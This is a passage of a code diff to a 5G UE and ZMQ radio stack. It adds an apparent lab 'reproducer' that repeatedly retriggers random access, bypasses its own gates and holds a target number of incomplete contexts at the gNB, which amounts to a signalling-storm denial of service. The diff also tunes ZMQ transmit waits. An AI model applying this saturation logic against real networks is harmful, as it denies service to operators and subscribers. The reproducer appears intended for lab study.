++      if (!rss_probe_done[pu]) {
++        rss_probe_done[pu] = true;
++        const uint64_t t0 = rss_probe_t0[pu] ? rss_probe_t0[pu] : pnow;
++        nr_rss_log(pu, "probe_connected", "\"tries\":%u,\"ms\":%llu",
++                   rss_probe_tries[pu], (unsigned long long)((pnow - t0) / 1000000ULL));
++      }
++      nr_timer_setup(t, 10, 10);
++      nr_timer_start(t);
++      return;
++    }
++    if (rss_probe_done[pu]) {
++      /* Lost the connection again: that is itself a denial observation. */
++      nr_rss_log(pu, "probe_lost", "\"tries\":%u", rss_probe_tries[pu]);
++      rss_probe_done[pu] = false;
++    }
++    if (rss_probe_t0[pu] == 0)
++      rss_probe_t0[pu] = pnow;
++    if (rss_probe_next_ns[pu] != 0 && pnow < rss_probe_next_ns[pu]) {
++      nr_timer_setup(t, 10, 10);
++      nr_timer_start(t);
++      return;
++    }
++    rss_probe_next_ns[pu] = pnow + 500000000ULL; /* retry about twice a second */
++    rss_probe_tries[pu]++;
++    nr_rss_log(pu, "probe_attempt", "\"try\":%u", rss_probe_tries[pu]);
++    tac->rss_deadline_ns = 0;
++    handle_t300_expiry(rrc);
++    nr_timer_setup(t, 10, 10);
++    nr_timer_start(t);
++    return;
++  }
++
++  if (cfg->max_duration_s > 0 && rss_t0_ns != 0
++      && rss_now_ns() - rss_t0_ns > (uint64_t)cfg->max_duration_s * 1000000000ULL) {
++    rss_killed = true;
++    LOG_W(NR_RRC, "[RSS] max_duration_s=%d reached: reproducer disabled, normal attach resumes\n", cfg->max_duration_s);
++    nr_rss_log((int)rrc->ue_id, "kill_switch", "\"attempts\":%u,\"ticks\":%u", rss_seq[0], rss_ticks);
++    return;
++  }
++
++  /* Not due yet. Keep polling; granularity is one tick, not one interval. */
++  if (tac->rss_deadline_ns != 0 && rss_now_ns() < tac->rss_deadline_ns) {
++    nr_timer_setup(t, 10, 10);
++    nr_timer_start(t);
++    return;
++  }
++
++  /* Occupancy ceiling: idle while the gNB already holds the requested number of
++     incomplete contexts. This is what makes the saturation level settable. */
++  if (cfg->target_occupancy > 0) {
++    unsigned occ = nr_rss_occupancy();
++    if (occ >= (unsigned)cfg->target_occupancy) {
++      if (rss_occ_hold_logs++ % 25 == 0)
++        nr_rss_log((int)rrc->ue_id, "occupancy_hold", "\"occupancy\":%u,\"target\":%d", occ, cfg->target_occupancy);
++      nr_timer_setup(t, 10, 10);
++      nr_timer_start(t);
++      return;
++    }
++  }
++
++  /* Gates. Both re-arm the poll instead of firing, and both are bypassed after
++     gate_timeout_ms so a stuck MAC state cannot stall a run silently. */
++  const NR_UE_MAC_INST_t *mac = get_mac_inst(rrc->ue_id);
++  const char *gate = NULL;
++  int gate_state = -1;
++
++  /* (1) RA in flight. nr_mac_start_ra(NR_MAC_RA_START_T300) calls reset_ra(),
++     whose memset wipes the live RA_config_t, so retriggering mid-RA destroys
++     our own attempt before Msg3 ever reaches the gNB. Measured 2026-10-20
++     (run SAT2): 269 attempts at the UE but only 93 Msg3 at the CU, and 65% of
++     attempts ended in under 10 ms. */
++  /* RA pipelining: with several slots the question is not "is an RA in flight"
++     but "is there room for another". rss_ra_alloc() answers that; when it finds
++     a slot the gates below are skipped entirely. At ra_parallel 1 it always
++     returns slot 0 and the stock gates apply unchanged. */
++  const bool rss_room = mac && mac->ra_parallel > 1 && rss_ra_alloc(mac) >= 0;
++  if (cfg->ra_gate && mac && !rss_room) {
++    switch (mac->ra->ra_state) {
++      case nrRA_GENERATE_PREAMBLE:
++      case nrRA_WAIT_RAR:
++      case nrRA_WAIT_MSGB:
++      case nrRA_WAIT_CONTENTION_RESOLUTION:
++        gate = "ra_in_flight";
++        gate_state = (int)mac->ra->ra_state;
++        break;
++      default:
++        break;
++    }
++  }
++
++  /* (2) Keep the Msg4 HARQ ACK: reset_ra() also clears the PUCCH prepared by
++     prepare_msg4_msgb_feedback(), and without the ACK the gNB drops the
++     contention early so nothing accumulates. */
++  if (!gate && cfg->ack_gate && mac && !rss_room && mac->ra->ra_pucch)
++    gate = "ack_pending";
++
++  /* A harvester exists only to occupy occasions and read the RARs that land
++     there, so the ack/ra gates that protect a full procedure do not apply. */
++  if (gate && nr_rss_is_harvester((int)rrc->ue_id))
++    gate = NULL;
++
++  if (gate) {
++    uint64_t now = rss_now_ns();
++    if (rss_gate_since_ns == 0)
++      rss_gate_since_ns = now;
++    bool forced = cfg->gate_timeout_ms > 0
++                  && now - rss_gate_since_ns > (uint64_t)cfg->gate_timeout_ms * 1000000ULL;
++    if (!forced) {
++      if (rss_gate_logs++ % 25 == 0)
++        nr_rss_log((int)rrc->ue_id, "gate_hold", "\"gate\":\"%s\",\"ra_state\":%d", gate, gate_state);
++      nr_timer_setup(t, 10, 10);
++      nr_timer_start(t);
++      return;
++    }
++    nr_rss_log((int)rrc->ue_id, "gate_forced", "\"gate\":\"%s\",\"held_ms\":%llu",
++               gate, (unsigned long long)((now - rss_gate_since_ns) / 1000000ULL));
++  }
++  rss_gate_since_ns = 0;
++
++  tac->rss_deadline_ns = 0;
++  nr_rss_log((int)rrc->ue_id, "retrigger", NULL);
++  handle_t300_expiry(rrc);
++}
+ 
+ void init_SI_timers(NR_UE_RRC_SI_INFO *SInfo)
+ {
+@@ -177,6 +1147,9 @@ void nr_rrc_handle_timers(NR_UE_RRC_INST_t *rrc)
+     handle_t300_expiry(rrc);
+   }
+ 
++  /* A-type reproducer: inert unless --rss.enable 1 */
++  rss_poll(rrc);
++
+   bool t301_expired = nr_timer_tick(&timers->T301);
+   // Upon T301 expiry, the UE shall perform the actions upon going to RRC_IDLE
+   // with release cause 'RRC connection failure'
+@@ -444,6 +1417,8 @@ void nr_rrc_set_sib1_timers_and_constants(NR_UE_Timers_Constants_t *tac, NR_SIB1
+         AssertFatal(false, "Invalid T300 %ld\n", sib1->ue_TimersAndConstants->t300);
+     }
+     nr_timer_setup(&tac->T300, k, 10); // 10ms step
++    /* A-type reproducer timer, armed only when an attempt is actually skipped */
++    nr_timer_setup(&tac->rss_retry_timer, 10, 10);
+     switch (sib1->ue_TimersAndConstants->t319) {
+       case NR_UE_TimersAndConstants__t319_ms100 :
+         k = 100;
+diff --git a/radio/zmq/zmq_imported.cpp b/radio/zmq/zmq_imported.cpp
+index 51dd842..ccc0638 100644
+--- a/radio/zmq/zmq_imported.cpp
++++ b/radio/zmq/zmq_imported.cpp
+@@ -39,6 +39,7 @@ void zmq_tx_channel::transmit(c16_t *samples, size_t nsamps, uint64_t timestamp)
+ 
+     std::lock_guard<std::mutex> q_lock(queue_mutex_);
+     queue_.push(std::move(msg));
++    queue_cvar_.notify_one();
+   }
+ 
+   sample_count_ += nsamps;
+@@ -58,6 +59,12 @@ bool zmq_tx_channel::pop_message(zmq_msg_t *msg)
+   return true;
+ }
+ 
++bool zmq_tx_channel::await_message(std::chrono::microseconds timeout)
++{
++  std::unique_lock<std::mutex> lock(queue_mutex_);
++  return queue_cvar_.wait_for(lock, timeout, [this] { return !queue_.empty(); });
++}
++
+ void zmq_tx_channel::start(uint64_t init_time)
+ {
+   sample_count_ = init_time;
+diff --git a/radio/zmq/zmq_imported.h b/radio/zmq/zmq_imported.h
+index a33ba59..6cf1cc7 100644
+--- a/radio/zmq/zmq_imported.h
++++ b/radio/zmq/zmq_imported.h
+@@ -24,6 +24,9 @@ class zmq_tx_channel {
+   std::atomic<bool> is_tx_enabled_ = false;
+   std::mutex transmit_alignment_mutex_;
+   std::condition_variable transmit_alignment_cvar_;
++  /* RSS: signalled when transmit() enqueues, so a consumer that has a REQ
++   * pending can be woken by the data instead of polling for it. */
++  std::condition_variable queue_cvar_;
+ 
+   zmq_tx_channel(void *s, uint64_t buffer_size) : socket_(s)
+   {
+@@ -40,6 +43,8 @@ class zmq_tx_channel {
+ 
+   void transmit(c16_t *samples, size_t nsamps, uint64_t timestamp);
+   bool pop_message(zmq_msg_t *msg);
++  /* RSS: block until the queue is non-empty or the timeout expires. */
++  bool await_message(std::chrono::microseconds timeout);
+ 
+   void start(uint64_t init_time);
+ 
+diff --git a/radio/zmq/zmq_radio.cpp b/radio/zmq/zmq_radio.cpp
+index e25f7c7..8d07fd5 100644
+--- a/radio/zmq/zmq_radio.cpp
++++ b/radio/zmq/zmq_radio.cpp
+@@ -38,6 +38,7 @@
+ #include <atomic>
+ #include <condition_variable>
+ #include <ring_buffer.h>
++#include <sched.h>
+ #include <zmq.h>
+ #include "zmq_imported.h"
+ #include "zmq_simd.h"
+@@ -66,12 +67,55 @@ struct zmq_state_t {
+   double sample_rate;
+ };
+ 
++/* RSS reproducer: TX poll wakeup -------------------------------------------- *
++ * tx_poll_thread() can only be woken by a socket event. Once a REQ has arrived
++ * but the local TX queue is still empty, the peer is blocked waiting for our
++ * REP and sends nothing more, so zmq_poll() can only return on its own 10 ms
++ * timeout. UE and DU run on one host over tcp://127.0.0.1, where the transport
++ * round trip is tens of microseconds; that timeout, not transport latency, is
++ * what stretches a sub-millisecond lateness of the local TX queue into a whole
++ * 10 ms radio frame (measured air/wall 0.25-0.49 against a 10 ms frame).
++ *
++ * RSS_ZMQ_TX_WAIT_US selects how the wait is served, so one binary can run all
++ * three variants:
++ *    0  original blocking zmq_poll(10 ms)
++ *   >0  usleep(n) re-check, like zmq_rx_channel::receive() does on the RX side
++ *   -1  sched_yield() spin, no sleep at all
++ *   -2  wait on the queue condition variable (woken by transmit())
++ * Default -2. Measured 2026-10-20 over 60 s runs:
++ *   usleep(100) costs ~288 us per starved REQ and usleep(20) ~240 us, i.e. the
++ *   cost is the scheduler wakeup latency, not the requested sleep, and ~29 s of
++ *   an 80 s run went into it. The spin removed the wait (117 ms total) but made
++ *   throughput worse (air/wall 2.15 -> 1.26) because it starves the producer
++ *   thread it is waiting on. The condition variable is the event-driven answer:
++ *   no polling, no CPU burn, woken exactly when samples are queued.
++ */
++static int rss_zmq_tx_wait_us(void)
++{
++  static int cached = INT32_MIN;
++  if (cached == INT32_MIN) {
++    const char *env = getenv("RSS_ZMQ_TX_WAIT_US");
++    cached = env ? atoi(env) : -2;
++  }
++  return cached;
++}
++
++/* REQs that arrived before the TX queue had samples, REQs served, and the
++ * wall-clock time actually spent waiting for the local TX queue. */
++static std::atomic<unsigned long> rss_zmq_tx_starved(0);
++static std::atomic<unsigned long> rss_zmq_tx_served(0);
++static std::atomic<unsigned long> rss_zmq_tx_starved_us(0);
++static std::atomic<unsigned long> rss_zmq_tx_reported(0);
++
+ static void tx_poll_thread(zmq_tx_channel *chan, size_t i, std::atomic<bool> *poll_thread_running)
+ {
+   zmq_pollitem_t item = {chan->socket_, 0, ZMQ_POLLIN, 0};
+   bool reply_requested = false;
++  bool starve_counted = false;
++  const int wait_us = rss_zmq_tx_wait_us();
+ 
+   while (*poll_thread_running) {
++    bool tx_queue_starved = false;
+     if (reply_requested) {
+       zmq_msg_t msg;
+       if (chan->pop_message(&msg)) {
+@@ -81,7 +125,47 @@ static void tx_poll_thread(zmq_tx_channel *chan, size_t i, std::atomic<bool> *po
+         }
+         zmq_msg_close(&msg);
+         reply_requested = false;
++        starve_counted = false;
++        rss_zmq_tx_served++;
++      } else {
++        /* REQ pending, nothing to send yet: no socket event can end this wait. */
++        tx_queue_starved = true;
++        if (!starve_counted) {
++          starve_counted = true;
++          rss_zmq_tx_starved++;
++        }
++      }
++    }
++
++    if (tx_queue_starved) {
++      /* The peer is blocked on our REP and sends nothing more, so zmq_poll()
++       * can only return on its own 10 ms timeout. Measure what this wait costs
++       * under either policy so the two can be compared directly. */
++      const auto t0 = std::chrono::steady_clock::now();
++      if (wait_us > 0)
++        usleep(wait_us);
++      else if (wait_us == -2)
++        chan->await_message(std::chrono::milliseconds(2));
++      else if (wait_us < 0)
++        sched_yield();
++      else
++        zmq_poll(&item, 1, 10);
++      rss_zmq_tx_starved_us +=
++          std::chrono::duration_cast<std::chrono::microseconds>(std::chrono::steady_clock::now() - t0).count();
++
++      const unsigned long n = rss_zmq_tx_starved.load();
++      if (n - rss_zmq_tx_reported.load() >= 250) {
++        rss_zmq_tx_reported.store(n);
++        LOG_I(HW,
++              "[ZMQ] TX antenna %d: %lu REQs starved / %lu served, %lu ms waiting for the local TX queue "
++              "(RSS_ZMQ_TX_WAIT_US=%d)\n",
++              (int)i,
++              n,
++              rss_zmq_tx_served.load(),
++              rss_zmq_tx_starved_us.load() / 1000,
++              wait_us);
+       }
++      continue;
+     }
+ 
+     int rc = zmq_poll(&item, 1, 10); // 10ms timeout
+@@ -106,6 +190,7 @@ static void tx_poll_thread(zmq_tx_channel *chan, size_t i, std::atomic<bool> *po
+         LOG_E(HW, "[ZMQ] Error, unexpected REQ before REP on TX antenna %d\n", (int)i);
+       }
+       reply_requested = true;
++      starve_counted = false;
+     }
+   }
+ }
